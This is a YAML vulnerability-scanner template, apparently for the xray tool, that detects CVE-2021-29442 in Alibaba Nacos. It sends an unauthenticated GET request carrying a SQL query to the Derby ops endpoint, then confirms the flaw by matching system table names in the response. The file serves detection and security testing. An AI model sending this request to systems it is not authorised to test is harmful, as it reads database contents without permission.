id: VUL-2021-34029
name: CVE-2021-29442
transport: http
tags:
    - alibaba-nacos
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
            headers: 
                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20120101 Firefox/51.0
            follow_redirects: false
        expression: 
            response.status == 200 && 
            response.raw_header.bcontains(b"application/json") && 
            "\"TABLENAME\":\"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)\"".bmatches(response.body)
expression: r0()
detail:
    vulnerability:
        proof: 
              info: "存在Alibaba Nacos 存在未授权SQL语句执行漏洞"
